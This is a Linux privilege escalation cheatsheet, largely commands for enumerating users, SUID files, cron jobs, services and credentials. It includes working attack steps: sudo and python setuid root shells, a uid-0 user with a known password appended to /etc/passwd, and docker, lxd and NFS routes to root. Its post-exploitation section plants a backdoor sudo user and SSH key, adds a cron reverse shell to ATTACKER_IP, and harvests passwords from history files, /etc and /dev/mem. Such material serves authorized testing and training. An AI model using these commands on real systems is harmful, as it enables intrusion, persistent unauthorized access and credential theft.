# Linux Privilege Escalation Cheatsheet

## System Information Gathering

### Basic System Info
```bash
# System information
uname -a
hostnamectl
cat /etc/os-release
cat /proc/version
whoami
id
groups
pwd
```

### Environment Variables
```bash
env
echo $PATH
echo $HOME
echo $USER
echo $SHELL
```

## User and Group Enumeration

### Current User Context
```bash
# Current user privileges
id
sudo -l
groups
whoami

# Check sudo permissions
sudo -l -l
```

### Other Users
```bash
# List all users
cat /etc/passwd
cat /etc/passwd | grep -v nologin | grep -v false
cut -d: -f1 /etc/passwd

# User login history
last
who
w
```

### Group Information
```bash
cat /etc/group
getent group
getent group sudo
getent group admin
```

## File System Enumeration

### World-Writable Files and Directories
```bash
# World writable files
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World writable files
find / -writable -type f 2>/dev/null
find / -perm -o w -type f 2>/dev/null
```

### SUID and SGID Files
```bash
# Find SUID files
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -exec ls -la {} \; 2>/dev/null

# Find SGID files
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 -exec ls -la {} \; 2>/dev/null
```

### Configuration Files
```bash
# Look for credentials in config files
find /home -name "*.txt" -o -name "*.pdf" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.doc" -o -name "*.docx" 2>/dev/null
find / -name "*.conf" 2>/dev/null
find / -name "config*" 2>/dev/null

# SSH keys
find / -name "authorized_keys" 2>/dev/null
find / -name "id_rsa*" 2>/dev/null
find / -name "id_dsa*" 2>/dev/null
find / -name "id_ed25519*" 2>/dev/null
```

## Process and Service Enumeration

### Running Processes
```bash
ps aux
ps -ef
top
htop
pstree
```

### Services and Daemons
```bash
systemctl list-units --type=service --state=running
service --status-all
chkconfig --list

# Network services
netstat -tulpn
ss -tulpn
lsof -i
```

## Network Information

### Network Configuration
```bash
ifconfig
ip a
ip route
route -n
arp -a
```

### Open Ports and Connections
```bash
netstat -antup
ss -antup
lsof -i :PORT
```

## Scheduled Tasks and Cron Jobs

### Cron Jobs
```bash
# System cron
cat /etc/crontab
ls -la /etc/cron.*
ls -la /var/spool/cron/
ls -la /var/spool/cron/crontabs/

# User cron
crontab -l
crontab -l -u root
crontab -l -u USERNAME
```

### Systemd Timers
```bash
systemctl list-timers
```

## Kernel and System Exploits

### Kernel Information
```bash
uname -a
cat /proc/version
lsb_release -a
cat /etc/*-release
```

### Installed Software
```bash
# Debian/Ubuntu
apt list --installed
dpkg -l

# RedHat/CentOS
rpm -qa
yum list installed

# Check for vulnerable versions
```

## Common Privilege Escalation Vectors

### Sudo Misconfigurations
```bash
# Check sudo permissions
sudo -l

# Common sudo exploits
# sudo vim -> :!/bin/bash
# sudo less -> !/bin/bash
# sudo awk 'BEGIN {system("/bin/bash")}'
# sudo find . -exec /bin/bash \; -quit
```

### PATH Variable Manipulation
```bash
# Check current PATH
echo $PATH

# Look for writable directories in PATH
echo $PATH | tr ":" "\n" | xargs ls -la

# Check for relative paths in scripts
strings /path/to/binary | grep -E "^[a-zA-Z]"
```

### Capabilities
```bash
# Find files with capabilities
getcap -r / 2>/dev/null

# Common capability exploits
# cap_setuid+ep on python3
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

## Automated Tools

### LinPEAS
```bash
# Download and run LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### LinEnum
```bash
# Download and run LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### Linux Smart Enumeration (LSE)
```bash
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh
./lse.sh
```

### pspy (Process monitoring)
```bash
# Monitor processes without root
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
```

## Common Exploits and Techniques

### Writable /etc/passwd
```bash
# If /etc/passwd is writable
echo 'hacker:$1$hacker$TzyKlv0KdCNAMANM5sFmC.:0:0:root:/root:/bin/bash' >> /etc/passwd
# Password: hacker
```

### Docker Group
```bash
# If user is in docker group
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

### LXC/LXD Group
```bash
# If user is in lxc/lxd group
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash
```

### NFS Shares
```bash
# Check for NFS exports
cat /etc/exports
showmount -e localhost

# Mount with no_root_squash
# On attacking machine:
sudo mount -t nfs TARGET:/path/to/share /mnt
cp /bin/bash /mnt/
sudo chown root:root /mnt/bash
sudo chmod +s /mnt/bash

# On target:
/path/to/share/bash -p
```

## Post-Exploitation

### Persistence
```bash
# Add user
useradd -m -s /bin/bash hacker
echo 'hacker:password' | chpasswd
usermod -aG sudo hacker

# SSH keys
mkdir -p ~/.ssh
echo 'YOUR_PUBLIC_KEY' >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Cron job
echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' | crontab -
```

### Credential Harvesting
```bash
# History files
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history

# Configuration files with passwords
grep -r password /etc/ 2>/dev/null
grep -r "pass=" /etc/ 2>/dev/null
find / -name "*.conf" -exec grep -l password {} \; 2>/dev/null

# Memory dumps
strings /dev/mem | grep -i password
```
